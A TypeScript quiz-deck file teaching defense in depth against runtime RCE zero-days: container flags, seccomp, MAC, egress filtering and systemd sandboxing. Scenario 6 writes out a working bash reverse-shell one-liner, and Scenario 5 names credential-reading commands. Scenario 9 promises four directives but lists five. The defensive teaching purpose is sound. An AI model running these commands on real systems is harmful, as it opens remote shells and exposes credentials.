import type { Deck } from '../questions';

export const DECK: Deck = {
  slug: 'runtime-rce-zero-day',
  title: 'Runtime zero-days (PHP2Shell & Node2Shell) & defense in depth',
  summary:
    'Nine scenarios on memory corruption zero-days in C runtimes (CVE-2026-109618, CVE-2026-109619, CVE-2026-111497): why application code validation fails, read-only rootfs containment, seccomp system call filtering, capability dropping, and container jailbreaks.',
  series: 'Security & Exploitation',
  cards: [
    {
      id: 'runtime-vs-app-code',
      tag: 'Scenario 1',
      topic: 'Runtime vs application vulnerability',
      difficulty: 'core',
      scenario:
        'A web application has 100% test coverage, uses strict parameterized SQL queries, sanitizes all inputs, and has zero eval() or exec() calls. Yet an attacker sends a crafted HTTP request and gets an unauthenticated root shell.',
      question:
        'How can an application with flawless userland code be exploited for remote code execution (RCE)?',
      answer: [
        '**The vulnerability resides in the underlying C/C++ runtime engine** (e.g. PHP core, V8, Node.js HTTP/chunk parser, or libuv), not in the application script.',
        'In PHP2Shell (CVE-2026-109618) and Node2Shell (CVE-2026-111497), malformed chunked transfer encoding triggers a heap buffer overflow in the runtime’s native protocol handler before the application’s code is ever executed.',
        'No amount of framework middleware, input sanitation, or code linting can protect against a vulnerability triggered in the socket ingestion parser.',
      ],
    },
    {
      id: 'readonly-rootfs-mitigation',
      tag: 'Scenario 2',
      topic: 'Read-only root filesystem (--read-only)',
      difficulty: 'core',
      scenario:
        'An attacker exploits a memory corruption bug in a Node.js process running inside a container. They attempt to write a reverse shell script to `/var/www/shell.sh` and compile an exploit in `/tmp`. The write fails with `Read-only file system`.',
      question:
        'Why is `--read-only` one of the most effective container security flags, and how do you handle applications that require temporary files?',
      answer: [
        '**`--read-only` mounts the container’s entire root filesystem as read-only.** Attackers cannot drop backdoor binaries, modify config files, or establish web shells.',
        '**For temporary files:** Mount dedicated `tmpfs` volumes with strict flags: `--tmpfs /tmp:rw,noexec,nosuid,size=64m`.',
        'The `noexec` option ensures that even if an attacker writes shellcode or an ELF binary to `/tmp`, the kernel prevents execution with `Permission denied`.',
      ],
    },
    {
      id: 'seccomp-syscall-containment',
      tag: 'Scenario 3',
      topic: 'Seccomp system call filtering',
      difficulty: 'deep',
      scenario:
        'An attacker achieves arbitrary memory write inside a Python/Node.js web process and redirects instruction pointer `EIP/RIP` to trigger `execve("/bin/sh")`. The process immediately crashes with `Bad system call (core dumped)`.',
      question:
        'Which kernel security mechanism caught the exploit, and how does seccomp enforce policy?',
      answer: [
        '**Seccomp (Secure Computing Mode) with a restrictive BPF profile.**',
        'Seccomp intercepts system calls made by a process at the kernel boundary. If `execve`, `execveat`, `fork`, or `clone` are omitted from the allowed system call whitelist, the kernel halts the thread with `SIGSYS` the instant the syscall is attempted.',
        'Even if an attacker gains arbitrary code execution in memory, they cannot spawn external processes, open raw sockets, or manipulate kernel namespaces.',
      ],
    },
    {
      id: 'dropping-linux-capabilities',
      tag: 'Scenario 4',
      topic: 'Capability dropping & rootless execution',
      difficulty: 'core',
      scenario:
        'A legacy container runs with `USER root` (UID 0). An exploit executes. The attacker tries to run `setuid(0)` or load a kernel module, but is rejected with `EPERM`.',
      question:
        'Which Docker/Kubernetes configuration stripped root of its traditional superpowers, and what capabilities should be retained?',
      answer: [
        '**`--cap-drop=ALL` (or in Kubernetes: `securityContext.capabilities.drop: ["ALL"]`).**',
        'In Linux, root privilege is segmented into distinct capabilities (e.g., `CAP_NET_BIND_SERVICE`, `CAP_SYS_ADMIN`, `CAP_NET_RAW`). A process with UID 0 but `cap-drop=ALL` cannot mount filesystems, load modules, trace processes (`CAP_SYS_PTRACE`), or change ownership (`CAP_CHOWN`).',
        'Best practice: Drop all capabilities, then explicitly re-add only what is strictly necessary (e.g. `CAP_NET_BIND_SERVICE` for port 80/443).',
      ],
    },
    {
      id: 'apparmor-selinux-confinement',
      tag: 'Scenario 5',
      topic: 'Mandatory Access Control (MAC)',
      difficulty: 'deep',
      scenario:
        'An attacker escapes memory safety and runs shell commands as user `www-data`. They attempt `cat /etc/shadow` and `cat /proc/1/environ` (containing cloud credentials). Both return `Permission denied`.',
      question:
        'Why does standard DAC (file permissions) allow reading /proc/1/environ in same-namespace processes, and which MAC layer enforced the block?',
      answer: [
        '**SELinux or AppArmor enforced Mandatory Access Control (MAC).**',
        'Standard Discretionary Access Control (DAC) evaluates only UID/GID bits. MAC evaluates security labels regardless of user identity.',
        'Under SELinux, a web server running with label `httpd_t` is confined by type enforcement policy. It is strictly forbidden from accessing `shadow_t` or reading foreign process environments, preventing credential scraping.',
      ],
    },
    {
      id: 'outbound-network-egress-filtering',
      tag: 'Scenario 6',
      topic: 'Egress filtering against reverse shells',
      difficulty: 'trap',
      scenario:
        'An attacker successfully executes `bash -i >& /dev/tcp/198.51.100.25/4444 0>&1`. The command blocks and times out without returning a shell connection to the attacker’s listener.',
      question:
        'Which infrastructure control neutralized the interactive shell, and why is egress filtering frequently overlooked?',
      answer: [
        '**Strict outbound egress firewall rules (Security Groups or Calico NetworkPolicies).**',
        'Most organizations focus 99% of effort on ingress filtering, leaving egress wide open (`0.0.0.0/0:all`).',
        'By restricting server egress to strictly required destinations (e.g. internal database port 5432 and payment gateway API via CIDR/proxy), all reverse shell callback connections to attacker C2 listeners are immediately dropped.',
      ],
    },
    {
      id: 'worker-memory-recycling',
      tag: 'Scenario 7',
      topic: 'Mitigating heap grooming via worker recycling',
      difficulty: 'deep',
      scenario:
        'A memory corruption exploit requires sending 50,000 carefully sequenced HTTP requests over 10 minutes to groom the process heap layout (heap feng shui) before triggering the vulnerability.',
      question:
        'Which simple web server configuration prevents multi-stage heap grooming in production?',
      answer: [
        '**Aggressive worker recycling via `pm2 max-restarts` / `max-memory-restart`, or PHP-FPM `pm.max_requests = 1000`.**',
        'By terminating and spawning fresh worker processes after every 1,000 requests, the process memory space and heap allocations are continuously cleared.',
        'This disrupts persistent heap layout manipulation, converting a potential high-reliability remote exploit into a harmless process crash that triggers an instant worker reboot.',
      ],
    },
    {
      id: 'non-root-user-namespaces',
      tag: 'Scenario 8',
      topic: 'User namespaces (userns)',
      difficulty: 'trap',
      scenario:
        'A containerized process exploits a zero-day and becomes UID 0 inside its container. It mounts a host device node and attempts to write to the host filesystem.',
      question:
        'If Docker user namespaces (`userns-remap`) are enabled, what UID does that process actually have on the host kernel?',
      answer: [
        '**An unprivileged high UID (e.g., UID 100000 or UID 1000).**',
        'User namespaces decouple the in-container UID mapping from the host UID mapping. A process that is `root` (UID 0) inside the container namespace is mapped to a totally unprivileged UID on the host.',
        'Even in the event of a full container breakout, the attacker holds zero administrative privileges on the host kernel.',
      ],
    },
    {
      id: 'systemd-service-sandboxing',
      tag: 'Scenario 9',
      topic: 'Systemd security flags for bare metal / VMs',
      difficulty: 'core',
      scenario:
        'You run a legacy PHP or Node.js service directly on a Linux VM (systemd), without Docker. You want container-like sandboxing.',
      question:
        'Which four systemd service directives provide instant process isolation without running Docker?',
      answer: [
        '1. **`ProtectSystem=strict`**: Mounts `/usr`, `/boot`, `/etc` as read-only.\n' +
        '2. **`ProtectHome=yes`**: Makes `/root`, `/home`, and `/run/user` completely inaccessible.\n' +
        '3. **`NoNewPrivileges=yes`**: Prevents the process and any child from gaining privileges via `setuid` binaries.\n' +
        '4. **`PrivateTmp=yes`**: Gives the process its own isolated `/tmp` directory that other users cannot see.\n' +
        '5. **`CapabilityBoundingSet=`**: Drops all Linux capabilities for that unit.',
      ],
    },
  ],
};
